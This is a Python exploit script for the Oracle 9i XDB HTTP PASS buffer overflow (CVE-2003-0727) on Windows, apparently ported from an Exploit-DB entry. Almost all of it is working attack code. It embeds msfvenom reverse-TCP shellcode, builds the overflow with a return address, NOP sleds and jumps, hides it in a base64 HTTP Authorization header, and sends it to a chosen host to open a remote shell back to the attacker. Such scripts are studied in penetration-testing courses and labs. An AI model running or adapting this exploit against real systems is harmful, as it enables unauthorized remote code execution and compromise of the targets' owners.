#!/usr/bin/env python
#
# Script name      		: oracle9i_http_exploit.py
# Req Modules      		: None standard
# How exploit was discovered	: David Litchfield
# Ported by			: wetw0rk
# Original Exploit              : https://www.exploit-db.com/exploits/16809/
# Version			: 1.0
# Python Version		: 2.7
# Description			: David Litchfield, displays multiple vulnerabilities
#                                 in the Oracle 9i XML Database. Oracle 9i XDB HTTP PASS
#                                 Overflow (win32)
#

import sys, socket, base64, random, string

try:

	target		= str(sys.argv[1])
	port		= int(sys.argv[2])
	ret		= "\x46\x6d\x61\x60" # Universal Return Address

except IndexError:

	print "############################################"
	print """# Oracle 9i XDB HTTP PASS Overflow Exploit #"""
	print """# CVE-2003-0727                            #"""
	print "############################################\n"
	print "Usage: %s <RHOST> <RPORT>" % sys.argv[0]
	print "Example: %s 10.11.1.202 8080" % sys.argv[0]
	sys.exit()

# msfvenom -p windows/shell/reverse_tcp LHOST=X LPORT=2 EXITFUNC=thread -b "\x00" -f python
buf =  ""
buf += "\xbd\xfb\xa2\x4f\x90\xdd\xc6\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x59\x83\xc2\x04\x31\x6a\x10\x03\x6a\x10\x19"
buf += "\x57\xb3\x78\x5f\x98\x4c\x79\x3f\x10\xa9\x48\x7f\x46"
buf += "\xb9\xfb\x4f\x0c\xef\xf7\x24\x40\x04\x83\x48\x4d\x2b"
buf += "\x24\xe6\xab\x02\xb5\x5a\x8f\x05\x35\xa0\xdc\xe5\x04"
buf += "\x6b\x11\xe7\x41\x91\xd8\xb5\x1a\xde\x4f\x2a\x2e\xaa"
buf += "\x53\xc1\x7c\x3b\xd4\x36\x34\x3a\xf5\xe8\x4e\x65\xd5"
buf += "\x0b\x82\x1e\x5c\x14\xc7\x1a\x16\xaf\x33\xd1\xa9\x79"
buf += "\x0a\x1a\x05\x44\xa2\xe9\x57\x80\x05\x11\x22\xf8\x75"
buf += "\xac\x35\x3f\x07\x6a\xb3\xa4\xaf\xf9\x63\x01\x51\x2e"
buf += "\xf5\xc2\x5d\x9b\x71\x8c\x41\x1a\x55\xa6\x7e\x97\x58"
buf += "\x69\xf7\xe3\x7e\xad\x53\xb0\x1f\xf4\x39\x17\x1f\xe6"
buf += "\xe1\xc8\x85\x6c\x0f\x1d\xb4\x2e\x58\xd2\xf5\xd0\x98"
buf += "\x7c\x8d\xa3\xaa\x23\x25\x2c\x87\xac\xe3\xab\xe8\x87"
buf += "\x54\x23\x17\x27\xa5\x6d\xdc\x73\xf5\x05\xf5\xfb\x9e"
buf += "\xd5\xfa\x2e\x0a\xd3\x6c\xda\xc0\xdb\xbf\xb2\xd4\xdb"
buf += "\x3f\x40\x50\x3d\x6f\x14\x32\x92\xd0\xc4\xf2\x42\xb9"
buf += "\x0e\xfd\xbd\xd9\x31\xd7\xd5\x70\xdd\x8e\x8e\xec\x44"
buf += "\x8b\x45\x8c\x89\x01\x20\x8e\x01\xa0\xd4\x41\xe1\xc1"
buf += "\xc6\xb6\x90\x29\x17\x47\x38\x2a\x7d\x43\xea\x7d\xe9"
buf += "\x49\xcb\x4a\xb6\xb2\x3e\xc9\xb1\x4d\xbe\xf8\xca\x78"
buf += "\x54\x45\xa5\x84\xb8\x45\x35\xd3\xd2\x45\x5d\x83\x86"
buf += "\x15\x78\xcc\x13\x0a\xd1\x59\x9b\x7b\x85\xca\xf3\x81"
buf += "\xf0\x3d\x5c\x79\xd7\x3d\x9a\x85\xa5\x63\x02\xee\x55"
buf += "\x24\xb2\xee\x3f\xa4\xe2\x86\xb4\x8b\x0d\x67\x34\x06"
buf += "\x46\xef\xbf\xc7\x25\x8e\xc0\xcd\xeb\x0e\xc0\xe2\x37"
buf += "\x46\x4f\x04\xc8\x67\xb1\x39\x1f\x5e\xc7\x7a\x9c\xe5"
buf += "\xc8\x98\x08\x10\x61\x05\xd9\x99\xec\xb6\x34\xdd\x08"
buf += "\x35\xbc\x9e\xee\x25\xb5\x9b\xab\xe1\x26\xd6\xa4\x87"
buf += "\x48\x45\xc4\x8d"

# Our raw exploit before being encoded to base64
print "[+] Generating That Pwn Sauce"
raw_exploit = "bruh" + ":"
raw_exploit += ''.join(random.sample(string.lowercase*17,len(string.lowercase*17)))
raw_exploit += "\xeb\x64" + "\x90\x90" + ret
raw_exploit += "\x90"*266 + "\xeb\x10" + "\x90"*109 + buf
# Base64 encoded exploit
print "[+] Adding Base64 Encoding On Top"
exploit = base64.b64encode(raw_exploit) + "="
# Sending our exploit
print "[+] Setting Up Malicous GET Request"
get_request = ""
get_request += "GET / HTTP/1.1\r\n"
get_request += "Host:%s:%d\r\n" % (target, port)
get_request += "Authorization: Basic %s\r\n\r\n" % (exploit)
# Send Our Exploit
print "[+] Better Have That Listener Setup!"
print "[+] Sending %s:%d The Secret Sauce" % (target, port)
tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_sock.connect((target, port))
tcp_sock.send(get_request)
response = tcp_sock.recv(4096)

